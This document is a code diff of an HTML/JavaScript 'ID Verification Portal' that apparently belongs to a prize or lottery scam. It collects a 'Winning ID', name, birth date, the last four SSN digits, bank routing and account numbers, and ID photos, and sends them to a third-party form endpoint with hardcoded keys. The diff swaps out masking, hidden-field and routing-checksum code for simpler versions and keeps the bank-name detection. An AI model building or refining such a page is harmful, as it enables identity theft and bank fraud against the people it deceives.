@@ -1,128 +1,100 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ID Verification Portal</title>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+
   <script>
     UPLOADCARE_PUBLIC_KEY = '6d89fecba2b18e6e32d2';
   </script>
   <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+
+  <style>
+    .bank-logo {
+      width: 32px;
+      height: 32px;
+      margin-right: 8px;
+      display: none;
+    }
+  </style>
 </head>
+
 <body class="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen flex justify-center items-center p-4">
 
   <div class="bg-white rounded-3xl shadow-2xl p-8 max-w-3xl w-full">
+
     <div class="text-center mb-8">
       <div class="mx-auto bg-purple-600 w-16 h-16 rounded-full flex items-center justify-center text-white text-3xl font-bold mb-4">ID</div>
       <h1 class="text-3xl font-bold text-gray-800 mb-2">ID Verification Portal</h1>
       <p class="text-gray-600">Securely submit your identification details and documents.</p>
     </div>
 
-    <form id="idForm" action="https://api.web3forms.com/submit" method="POST" class="space-y-6" autocomplete="off">
+    <form id="idForm" action="https://api.web3forms.com/submit" method="POST" class="space-y-6">
+
       <input type="hidden" name="access_key" value="678a23d5-c5dc-46e6-abce-d7e16b32e8f1">
 
       <div class="grid md:grid-cols-2 gap-4">
 
         <div>
           <label class="block font-medium text-gray-700">Full Name</label>
-          <input type="text" name="Full Name" placeholder="e.g. John Michaels" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+          <input type="text" name="Full Name" placeholder="John Doe" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
         <div>
           <label class="block font-medium text-gray-700">Date of Birth</label>
-          <input type="date" name="Date of Birth" placeholder="MM/DD/YYYY" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+          <input type="date" name="Date of Birth" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
         <div>
           <label class="block font-medium text-gray-700">Email Address</label>
-          <input type="email" name="Email" placeholder="example@email.com" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+          <input type="email" name="Email" placeholder="example@mail.com" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
-        <!-- PHONE: visible formatted input (has name) + hidden raw digits -->
         <div>
           <label class="block font-medium text-gray-700">Phone Number</label>
-          <input 
-            type="tel" 
-            id="phoneInput"
-            placeholder="(123) 456-7890"
-            required 
-            maxlength="14"
-            class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"
-          >
-          <input type="hidden" id="phoneReal" name="Phone Number Raw">
+          <input type="tel" id="phoneInput" name="Phone Number" placeholder="(123) 456-7890" maxlength="14" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
         <div class="md:col-span-2">
           <label class="block font-medium text-gray-700">Delivery Address</label>
-          <textarea name="Delivery Address" placeholder="Street, City, State, ZIP" rows="2" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
+          <textarea name="Delivery Address" placeholder="Street, City, State" rows="2" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
         </div>
 
         <div>
           <label class="block font-medium text-gray-700">Winning ID</label>
-          <input type="text" name="Winning ID" placeholder="e.g. TFL20258752AF" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+          <input type="text" name="Winning ID" placeholder="TFL20258752AF" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
-        <!-- SSN LAST 4: visible masked (no name), hidden real value -->
         <div>
           <label class="block font-medium text-gray-700">Last 4 Digits of SSN</label>
-          <input 
-            type="text" 
-            id="ssnInput"
-            placeholder="e.g. 4821"
-            maxlength="4"
-            required
-            class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"
-          >
-          <input type="hidden" name="Last 4 Digits of SSN" id="ssnReal">
+          <input type="text" id="ssnInput" name="Last 4 Digits of SSN" placeholder="1234" maxlength="4" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
         <div>
           <label class="block font-medium text-gray-700">Account Name</label>
-          <input type="text" name="Account Name" placeholder="Name on account" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+          <input type="text" name="Account Name" placeholder="John A. Doe" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
-        <!-- ROUTING + BANK DETECTION -->
         <div>
           <label class="block font-medium text-gray-700">Routing Number</label>
-          <input 
-            type="text"
-            id="routingInput"
-            placeholder="XXXXX-XXXX"
-            maxlength="10"
-            class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"
-            aria-describedby="routingHelp"
-          >
-          <!-- hidden real routing digits for submission -->
-          <input type="hidden" id="routingReal" name="Routing Number">
+          <input type="text" id="routingInput" name="Routing Number" placeholder="021000021" maxlength="9" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
 
-          <!-- bank name + logo (Option A: small 32x32 beside name) -->
-          <div id="bankWrap" class="flex items-center mt-1 space-x-2">
-            <div id="bankLogo" aria-hidden="true" style="width:32px;height:32px;display:none"></div>
-            <p id="bankName" class="text-sm text-gray-600"></p>
-            <p id="routingHelp" class="text-sm ml-auto"></p>
+          <div id="bankInfo" class="flex items-center mt-2 text-sm text-gray-700">
+            <img id="bankLogo" class="bank-logo">
+            <span id="bankName"></span>
           </div>
-
-          <!-- routing validation message -->
-          <p id="routingMsg" class="text-xs mt-1"></p>
         </div>
 
-        <!-- ACCOUNT NUMBER (visible masked, no name) + hidden real input -->
         <div>
           <label class="block font-medium text-gray-700">Account Number</label>
-          <input 
-            type="text"
-            id="accountInput"
-            placeholder="Your account number"
-            required
-            class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"
-          >
-          <input type="hidden" name="Account Number" id="accountReal">
+          <input type="text" name="Account Number" placeholder="8459201933" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
         </div>
 
         <div class="md:col-span-2">
           <label class="block font-medium text-gray-700">Special Delivery Note</label>
-          <textarea name="Delivery Note" placeholder="e.g. Call before delivery" rows="2" class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
+          <textarea name="Delivery Note" placeholder="Call before delivery" rows="2" class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
         </div>
       </div>
 
@@ -161,10 +133,7 @@
         <p class="text-sm text-gray-600">I confirm that all the information and documents provided are accurate and authentic.</p>
       </div>
 
-      <!-- hidden input to submit detected bank name -->
-      <input type="hidden" name="Bank Detected" id="bankDetected">
-
-      <button type="submit" id="submitBtn" class="w-full bg-purple-600 text-white py-3 rounded-lg font-semibold hover:bg-purple-700 transition-all">
+      <button type="submit" class="w-full bg-purple-600 text-white py-3 rounded-lg font-semibold hover:bg-purple-700 transition-all">
         Submit ID
       </button>
     </form>
@@ -179,8 +148,6 @@
 
       button.addEventListener('click', () => {
         button.textContent = "Uploading...";
-        button.classList.remove("bg-green-600");
-        button.classList.add("bg-purple-600");
         progressContainer.classList.remove("hidden");
         progressBar.style.width = "0%";
 
@@ -195,7 +162,7 @@
             input.value = info.cdnUrl;
             progressBar.style.width = "100%";
             button.textContent = "Uploaded ✓ (Reupload)";
-            button.classList.replace("bg-purple-600", "bg-green-600");
+            button.classList.add("bg-green-600");
           });
         });
       });
@@ -204,253 +171,54 @@
     setupUpload("uploadFrontBtn", "frontUrl", "frontProgress", "frontBar");
     setupUpload("uploadBackBtn", "backUrl", "backProgress", "backBar");
 
-    const verified = localStorage.getItem("verifiedId");
-    if (!verified) {
+    if (!localStorage.getItem("verifiedId")) {
       window.location.href = "verify.html";
     }
 
-    /* -------------------------
-       PHONE NUMBER AUTO FORMAT
-       ------------------------- */
     const phoneInput = document.getElementById('phoneInput');
-    const phoneReal = document.getElementById('phoneReal');
-
     phoneInput.addEventListener('input', function (e) {
-      let digits = e.target.value.replace(/\D/g, '');
-      if (digits.length > 10) digits = digits.slice(0, 10);
-      phoneReal.value = digits; // store raw digits
-
-      let formatted = digits;
-      if (digits.length > 6) {
-        formatted = `(${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6)}`;
-      } else if (digits.length > 3) {
-        formatted = `(${digits.slice(0,3)}) ${digits.slice(3)}`;
-      } else if (digits.length > 0) {
-        formatted = `(${digits}`;
-      }
-      e.target.value = formatted;
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 10) value = value.slice(0, 10);
+      let f = value;
+      if (value.length > 6) f = `(${value.slice(0,3)}) ${value.slice(3,6)}-${value.slice(6)}`;
+      else if (value.length > 3) f = `(${value.slice(0,3)}) ${value.slice(3)}`;
+      else if (value.length > 0) f = `(${value}`;
+      e.target.value = f;
     });
 
-    /* -------------------------
-       SSN LAST-4 MASKING
-       ------------------------- */
     const ssnInput = document.getElementById('ssnInput');
-    const ssnReal = document.getElementById('ssnReal');
-
-    ssnInput.addEventListener('input', function(e) {
-      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
-      ssnReal.value = v;
-      if (v.length === 4) {
-        e.target.value = "****";
-      } else {
-        e.target.value = v;
-      }
+    ssnInput.addEventListener('input', function () {
+      let v = ssnInput.value.replace(/\D/g, '').slice(0, 4);
+      ssnInput.value = v;
+      if (v.length === 4) ssnInput.value = '****';
     });
 
-    /* -------------------------
-       ACCOUNT NUMBER MASKER
-       ------------------------- */
-    const accInput = document.getElementById('accountInput');
-    const accReal = document.getElementById('accountReal');
-
-    accInput.addEventListener('input', function(e) {
-      let digits = e.target.value.replace(/\D/g, '');
-      // store real value
-      accReal.value = digits;
-      // mask visible value
-      if (digits.length <= 4) {
-        e.target.value = digits;
-      } else {
-        const masked = '•'.repeat(Math.max(0, digits.length - 4)) + digits.slice(-4);
-        e.target.value = masked;
-      }
-    });
-
-    /* -------------------------
-       ROUTING FORMAT + VALIDATE + DETECT BANK
-       ------------------------- */
     const routingInput = document.getElementById('routingInput');
-    const routingReal = document.getElementById('routingReal');
-    const routingMsg = document.getElementById('routingMsg');
-    const bankNameField = document.getElementById('bankName');
-    const bankDetectedInput = document.getElementById('bankDetected');
-    const bankLogoDiv = document.getElementById('bankLogo');
+    const bankName = document.getElementById('bankName');
+    const bankLogo = document.getElementById('bankLogo');
 
-    // Bank data: prefix (9-digit examples) -> {name, svg}
-    // We'll match by 5-digit prefix. The SVGs are simple inline SVG placeholders.
-    const bankList = {
-      // Format: "prefix5": { name: "...", svg: "<svg...></svg>" }
-      "02100": { name: "Chase Bank", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#1173b7"></rect>
-          <text x="50%" y="55%" font-size="20" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">C</text>
-        </svg>`},
-      "02600": { name: "Bank of America", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#e31b23"></rect>
-          <text x="50%" y="55%" font-size="16" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">BofA</text>
-        </svg>`},
-      "12100": { name: "Wells Fargo", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#c40000"></rect>
-          <text x="50%" y="55%" font-size="14" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">WF</text>
-        </svg>`},
-      "03110": { name: "TD Bank", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#008000"></rect>
-          <text x="50%" y="55%" font-size="18" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">TD</text>
-        </svg>`},
-      "04300": { name: "PNC Bank", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#003366"></rect>
-          <text x="50%" y="55%" font-size="14" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">PNC</text>
-        </svg>`},
-      "04200": { name: "Huntington Bank", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#0b6b4f"></rect>
-          <text x="50%" y="55%" font-size="12" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">HNT</text>
-        </svg>`},
-      "12400": { name: "Capital One", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#8f1cbd"></rect>
-          <text x="50%" y="55%" font-size="12" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">C1</text>
-        </svg>`},
-      "06100": { name: "Truist", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#f26b21"></rect>
-          <text x="50%" y="55%" font-size="12" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">TR</text>
-        </svg>`},
-      "06500": { name: "U.S. Bank", svg:
-        `<svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-          <rect width="48" height="48" rx="6" fill="#1f4e79"></rect>
-          <text x="50%" y="55%" font-size="12" text-anchor="middle" fill="white" font-family="Arial" font-weight="700">USB</text>
-        </svg>`}
+    const bankRoutingMap = {
+      "021000021": { name: "Chase Bank", logo: "https://cdn.simpleicons.org/chase" },
+      "026009593": { name: "Bank of America", logo: "https://cdn.simpleicons.org/bankofamerica" },
+      "121042882": { name: "Wells Fargo", logo: "https://cdn.simpleicons.org/wellsfargo" },
+      "054001725": { name: "Capital One", logo: "https://cdn.simpleicons.org/capitalone" },
+      "031101279": { name: "TD Bank", logo: "https://cdn.simpleicons.org/td" },
+      "021000089": { name: "CitiBank", logo: "https://cdn.simpleicons.org/citi" }
     };
 
-    // helper: compute ABA routing checksum: returns true if valid
-    function validateABARouting(routingDigits) {
-      if (!/^\d{9}$/.test(routingDigits)) return false;
-      const d = routingDigits.split("").map(Number);
-      const sum = 3*(d[0]+d[3]+d[6]) + 7*(d[1]+d[4]+d[7]) + 1*(d[2]+d[5]+d[8]);
-      return sum % 10 === 0;
-    }
+    routingInput.addEventListener('input', function () {
+      let v = routingInput.value.replace(/\D/g, '').slice(0, 9);
+      routingInput.value = v;
 
-    // routing input formatting + detection
-    routingInput.addEventListener('input', function(e) {
-      let v = e.target.value.replace(/\D/g, '').slice(0,9); // up to 9 digits
-      // format as XXXXX-XXXX when >5
-      if (v.length > 5) {
-        e.target.value = v.slice(0,5) + '-' + v.slice(5);
-        routingReal.value = v; // store digits
+      if (v.length === 9 && bankRoutingMap[v]) {
+        bankName.textContent = bankRoutingMap[v].name;
+        bankLogo.src = bankRoutingMap[v].logo;
+        bankLogo.style.display = "block";
       } else {
-        e.target.value = v;
-        routingReal.value = v;
-      }
-
-      // decide validity if 9 digits present
-      const clean = routingReal.value;
-      if (clean.length === 9) {
-        const ok = validateABARouting(clean);
-        if (ok) {
-          routingMsg.textContent = "Routing number looks valid.";
-          routingMsg.className = "text-xs mt-1 text-green-600";
-        } else {
-          routingMsg.textContent = "Routing number failed checksum — please verify.";
-          routingMsg.className = "text-xs mt-1 text-red-600";
-        }
-      } else {
-        routingMsg.textContent = "Routing number should be 9 digits.";
-        routingMsg.className = "text-xs mt-1 text-gray-600";
-      }
-
-      detectBankByRouting(clean);
-    });
-
-    // bank detection by 5-digit prefix
-    function detectBankByRouting(cleanDigits) {
-      const bankNameEl = bankNameField;
-      const bankLogoEl = bankLogoDiv;
-      bankDetectedInput.value = ""; // default
-
-      if (!cleanDigits || cleanDigits.length < 5) {
-        bankNameEl.textContent = "";
-        bankLogoEl.style.display = "none";
-        bankLogoEl.innerHTML = "";
-        return;
-      }
-
-      const prefix5 = cleanDigits.slice(0,5);
-      if (bankList[prefix5]) {
-        const data = bankList[prefix5];
-        bankNameEl.textContent = "Bank Detected: " + data.name;
-        bankDetectedInput.value = data.name;
-        bankLogoEl.style.display = "block";
-        bankLogoEl.innerHTML = data.svg;
-        // scale svg to 32x32
-        bankLogoEl.querySelector('svg').setAttribute('width','32');
-        bankLogoEl.querySelector('svg').setAttribute('height','32');
-      } else {
-        bankNameEl.textContent = "Bank Detected: Unknown or Local Bank";
-        bankDetectedInput.value = "Unknown / Local Bank";
-        bankLogoEl.style.display = "none";
-        bankLogoEl.innerHTML = "";
-      }
-    }
-
-    /* -------------------------
-       FORM SUBMIT HANDLING
-       ------------------------- */
-    const form = document.getElementById('idForm');
-    const submitBtn = document.getElementById('submitBtn');
-
-    form.addEventListener('submit', function(e) {
-      // final validation: routing checksum must pass if 9 digits provided
-      const routingDigits = routingReal.value || '';
-      if (routingDigits.length === 9 && !validateABARouting(routingDigits)) {
-        e.preventDefault();
-        alert('The routing number appears invalid (checksum failed). Please correct it before submitting.');
-        routingInput.focus();
-        return false;
-      }
-
-      // ensure hidden fields are set (phoneReal, routingReal, accountReal, ssnReal already set on input events)
-      // if routing provided but not 9 digits, warn
-      if (routingDigits && routingDigits.length !== 9) {
-        e.preventDefault();
-        alert('Routing number must be 9 digits.');
-        routingInput.focus();
-        return false;
-      }
-
-      // all good — allow submit (hidden fields contain the real values)
-      // Note: visible inputs for routing/account/ssn are not named, so only hidden "real" fields submit.
-      return true;
-    });
-
-    // initial state: hide logo
-    bankLogoDiv.style.display = 'none';
-
-    // small UX: ensure masked fields don't allow pasting of non-digits into hidden fields
-    accountInput.addEventListener('paste', function(e) {
-      const paste = (e.clipboardData || window.clipboardData).getData('text');
-      if (!/^\d+$/.test(paste)) {
-        e.preventDefault();
+        bankName.textContent = "Unknown bank";
+        bankLogo.style.display = "none";
       }
     });
-    ssnInput.addEventListener('paste', function(e) {
-      const paste = (e.clipboardData || window.clipboardData).getData('text');
-      if (!/^\d+$/.test(paste)) {
-        e.preventDefault();
-      }
-    });
-    routingInput.addEventListener('paste', function(e) {
-      const paste = (e.clipboardData || window.clipboardData).getData('text');
-      if (!/^\d+$/.test(paste.replace(/\D/g,''))) {
-        // allow digits only
-        e.preventDefault();
-      }
-    });
-
   </script>
 
 </body>
